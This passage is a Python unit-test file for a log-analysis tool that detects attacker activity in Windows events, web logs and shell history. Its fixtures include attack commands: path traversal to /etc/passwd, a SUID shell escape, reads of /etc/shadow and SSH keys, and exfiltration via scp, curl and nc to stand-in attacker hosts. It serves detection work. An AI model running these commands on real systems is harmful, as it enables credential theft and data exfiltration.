        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "winlogbeat-windows.json"
            path.write_text(_json.dumps(record, indent=2), encoding="utf-8")
            result = auto_parse(str(path))

        self.assertEqual(result.log_type, "Windows Event Log (JSON)")
        self.assertEqual(result.stats.total, 1)
        self.assertEqual(result.stats.parse_errors, 0)
        event = result.events[0]
        self.assertEqual(event.event_id, "4688")
        self.assertEqual(event.host, "pedro-computer")
        self.assertIn("auditpol-tampering", event.tags)
        self.assertIn("defense-evasion", event.tags)

    def test_parser_registry_supports_explicit_type_and_content_input(self):
        """解析层应支持强制类型和内存内容，方便 Remote Collector 复用。"""
        content = (
            "9.9.9.9 - - [15/Mar/2024:10:01:00 +0800] "
            "\"GET /download.php?file=../../etc/passwd HTTP/1.1\" 200 10 \"-\" \"curl/8\"\n"
        )
        self.assertIn("web-access", list_parser_names())

        parsed = parse_content(content, "remote-host:/var/log/nginx/access.log")
        self.assertEqual(parsed.log_type, "Web Access Log (Apache/Nginx)")
        self.assertEqual(parsed.events[0].source_file, "remote-host:/var/log/nginx/access.log")

        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "access.log"
            path.write_text(content, encoding="utf-8")
            forced = auto_parse(str(path), parser_name="generic")
        self.assertEqual(forced.log_type, "通用日志")

    def test_shell_history_parser_extracts_attack_commands(self):
        content = "\n".join([
            "ls -la",
            "whoami",
            "wget https://example.test/linux-exploit-suggester.sh -O les.sh",
            "sudo -l",
            "find / -type f -user root -perm -4000 2>/dev/null",
            "./usr/bin/python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
            "cat /etc/shadow",
            "rm /var/www/html/uploads/x.phtml",
        ]) + "\n"

        result = parse_shell_history(content, ".bash_history")

        self.assertEqual(result.log_type, "Shell History")
        self.assertIn("shell-history", list_parser_names())
        self.assertEqual(result.stats.total, 7)
        tags = {tag for event in result.events for tag in event.tags}
        self.assertIn("tool-download", tags)
        self.assertIn("privilege-escalation", tags)
        self.assertIn("linux-credential-file", tags)
        self.assertIn("artifact-deletion", tags)
        commands = [event.details.get("command") for event in result.events]
        self.assertNotIn("ls -la", commands)

    def test_shell_history_parser_detects_ssh_and_app_secret_reads(self):
        content = "\n".join([
            "less ~/.ssh/id_rsa",
            "grep DB_PASSWORD /var/www/html/.env",
            "tail -50 /srv/app/config.php",
        ]) + "\n"

        result = parse_shell_history(content, ".zsh_history")

        self.assertEqual(result.stats.total, 3)
        self.assertEqual({event.rule_name for event in result.events}, {"Linux 敏感凭据文件读取"})
        self.assertEqual({event.details.get("action") for event in result.events}, {"credential-file-read"})
        self.assertIn("T1552.004", {event.mitre_attack for event in result.events})

    def test_shell_history_parser_detects_data_exfiltration_commands(self):
        content = "\n".join([
            "scp /var/backups/db.sql.gz attacker@198.51.100.10:/tmp/db.sql.gz",
            "rsync -az ./uploads attacker@198.51.100.10:/tmp/uploads",
            "curl --upload-file /tmp/secrets.tar.gz https://exfil.example/upload",
            "nc 198.51.100.11 4444 < /etc/passwd",
            "scp analyst@backup:/tmp/report ./report",
            r"scp /tmp/report C:\Users\alice\report",
        ]) + "\n"

        result = parse_shell_history(content, "server01:/home/alice/.bash_history")

        self.assertEqual(result.stats.total, 4)
        self.assertEqual({event.rule_name for event in result.events}, {"Shell 数据外传命令"})
        self.assertEqual({event.details.get("action") for event in result.events}, {"data-exfiltration"})
        tags = {tag for event in result.events for tag in event.tags}
        self.assertIn("shell-exfiltration", tags)
        self.assertIn("data-exfiltration", tags)
        self.assertEqual({event.mitre_attack for event in result.events}, {"T1041"})
        self.assertNotIn("analyst@backup:/tmp/report", [event.details.get("command") for event in result.events])

    def test_shell_history_parser_extracts_zsh_time_and_source_context(self):
        result = parse_shell_history(
            ": 1710500000:0;cat /etc/shadow\n",
            "server01:/home/alice/.zsh_history",
        )

        self.assertEqual(result.stats.total, 1)
        event = result.events[0]
        self.assertTrue(event.timestamp.endswith("+00:00"))
        self.assertEqual(event.user, "alice")
        self.assertEqual(event.host, "server01")
        self.assertEqual(event.details.get("account"), "alice")
        self.assertEqual(event.details.get("asset"), "server01")

    def test_parser_registry_detects_bash_history_file(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / ".bash_history"
            path.write_text("id\nsudo -l\ncat /etc/shadow\n", encoding="utf-8")

            result = auto_parse(str(path))

        self.assertEqual(result.log_type, "Shell History")
        self.assertEqual([event.rule_name for event in result.events], [
            "主机信息枚举",
            "提权命令痕迹",
            "Linux 敏感凭据文件读取",
        ])
